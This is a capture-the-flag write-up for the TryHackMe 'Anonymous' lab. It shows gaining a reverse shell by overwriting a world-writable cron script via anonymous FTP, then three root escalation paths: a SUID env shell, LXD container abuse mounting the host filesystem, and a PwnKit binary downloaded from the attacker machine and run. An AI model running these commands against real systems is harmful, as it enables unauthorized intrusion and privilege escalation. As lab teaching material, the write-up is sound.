# Anonymous

Room: https://tryhackme.com/room/anonymous

Not the hacking group

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/anonymous.md

---

## Summary

This machine exposed anonymous FTP and SMB access. Anonymous FTP revealed a writable `scripts` directory containing a cleanup script. The script was executed every minute as the user `namelessone`, allowing command execution and a reverse shell.

Privilege escalation was possible in three ways:

1. Intended path: SUID `/usr/bin/env`
2. Alternate path: `lxd` group abuse
3. Kernel/local exploit path: PwnKit

Root flag:

```text
4d930091c31a622a7ed10f27999af***
```

---

## Enumeration

A full TCP scan found four open ports:

```text
21/tcp   ftp
22/tcp   ssh
139/tcp  netbios-ssn
445/tcp  smb
```

Nmap showed anonymous FTP was enabled:

```text
21/tcp open ftp vsftpd 3.0.3
Anonymous FTP login allowed
```

It also revealed a writable FTP directory:

```text
/scripts
```

SMB was also accessible anonymously and exposed a `pics` share:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service
```

---

## FTP Enumeration

Logged in to FTP anonymously:

```bash
ftp 10.66.135.223
```

The FTP root contained a `scripts` directory:

```text
drwxrwxrwx    2 111      113      4096 Jun 04  2020 scripts
```

Inside `scripts`:

```text
clean.sh
removed_files.log
to_do.txt
```

The `to_do.txt` file confirmed anonymous FTP was a known issue:

```text
I really need to disable the anonymous login...it's really not safe
```

The cleanup script was world-writable:

```text
-rwxr-xrwx clean.sh
```

Contents of `clean.sh`:

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

The log file kept growing, suggesting the script was being run by a scheduled task.

---

## Confirming Code Execution

I replaced `clean.sh` with a harmless marker payload:

```bash
#!/bin/bash
echo "$(date) | PWN_TEST_MARKER | $(id)" >> /var/ftp/scripts/removed_files.log
```

After uploading it through FTP and waiting for the next minute, the log showed:

```text
Wed Jun 24 11:17:01 UTC 2026 | PWN_TEST_MARKER | uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
Wed Jun 24 11:18:01 UTC 2026 | PWN_TEST_MARKER | uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

This confirmed:

```text
clean.sh runs every minute as namelessone
```

---

## Initial Shell

The marker payload was replaced with a reverse shell payload and uploaded back to FTP.

A listener was started on the AttackBox:

```bash
nc -lvnp 4444
```

After the scheduled task executed, a shell was received as `namelessone`.

User context:

```text
uid=1000(namelessone) gid=1000(namelessone)
groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

---

# Privilege Escalation Method 1 — SUID `/usr/bin/env`

SUID enumeration showed an unusual SUID binary:

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
```

Interesting result:

```text
root root 4755 /usr/bin/env
```

Because `/usr/bin/env` had the SUID bit set, it could be used to launch a shell while preserving elevated privileges:

```bash
/usr/bin/env /bin/sh -p
```

Result:

```text
# whoami
root
```

Root flag:

```bash
cd /root
cat root.txt
```

```text
4d930091c31a622a7ed10f27999af***
```

This appears to be the intended privilege escalation path for the room.

---

# Privilege Escalation Method 2 — LXD Group

The `namelessone` user was also in the `lxd` group:

```text
groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

LXD had no local images:

```bash
lxc image list
```

An Alpine image was built on the AttackBox and served over HTTP:

```bash
python3 -m http.server 8000
```

On the target, the image was downloaded:

```bash
cd /tmp
wget http://10.66.109.108:8000/alpine-v3.24-x86_64-20260624_1129.tar.gz
```

LXD was initialized:

```bash
lxd init --auto
```

The Alpine image was imported:

```bash
lxc image import ./alpine-v3.24-x86_64-20260624_1129.tar.gz --alias alpine
```

Confirmed image import:

```text
ALIAS   FINGERPRINT   DESCRIPTION
alpine  ed0f95e0c4b0  alpine v3.24
```

A privileged container was created:

```bash
lxc init alpine privesc -c security.privileged=true
```

The host filesystem was mounted into the container:

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

The container was started and entered:

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

Inside the container:

```text
uid=0(root) gid=0(root)
```

The host root filesystem was mounted at:

```text
/mnt/root
```

The host root flag was readable:

```bash
ls /mnt/root/root
cat /mnt/root/root/root.txt
```

A host-context root shell was also possible with `chroot`:

```bash
chroot /mnt/root /bin/bash
```

After chroot:

```text
root@privesc:/# cd /root
root@privesc:~# cat root.txt
4d930091c31a622a7ed10f27999af***
```

This was a valid alternate root path, but it does not appear to be the intended one.

---

# Privilege Escalation Method 3 — PwnKit

A PwnKit binary was transferred from the AttackBox to the target:

```bash
wget http://10.66.109.108:8000/PwnKit
```

Made executable:

```bash
chmod +x PwnKit
```

Executed:

```bash
./PwnKit
```

The exploit returned a root shell:

```text
whoami
root
```

The root flag was then readable:

```bash
cd /root
cat root.txt
```

```text
4d930091c31a622a7ed10f27999af***
```

This is another working route, but it is a generic local privilege escalation rather than the intended room-specific path.

---

## Root Paths Confirmed

### Initial Access

```text
Anonymous FTP
→ writable /scripts/clean.sh
→ scheduled execution every minute
→ reverse shell as namelessone
```

### Root Method 1 — Intended

```text
SUID /usr/bin/env
→ /usr/bin/env /bin/sh -p
→ root
```

### Root Method 2 — LXD

```text
namelessone in lxd group
→ import Alpine image
→ privileged LXD container
→ mount host filesystem
→ chroot into /mnt/root
→ root filesystem access
```

### Root Method 3 — PwnKit

```text
Transfer PwnKit binary
→ execute as namelessone
→ root shell
```

---

## Lessons Learned

* Anonymous FTP should not be enabled unless absolutely required.
* Writable directories exposed over FTP can become dangerous when scripts inside them are executed by scheduled tasks.
* Log files can reveal whether cron jobs or scheduled tasks are running.
* Always enumerate SUID binaries after gaining a shell.
* SUID on unexpected binaries like `/usr/bin/env` can lead directly to root.
* Membership in the `lxd` group is effectively root-equivalent if LXD can be initialized.
* Generic local privilege escalation exploits may work, but they are usually not the intended CTF path.

---

## Cleanup Notes

If testing the LXD path, remove the created container afterwards:

```bash
lxc stop privesc
lxc delete privesc
```

If testing payloads through FTP, restore the original `clean.sh` when finished.
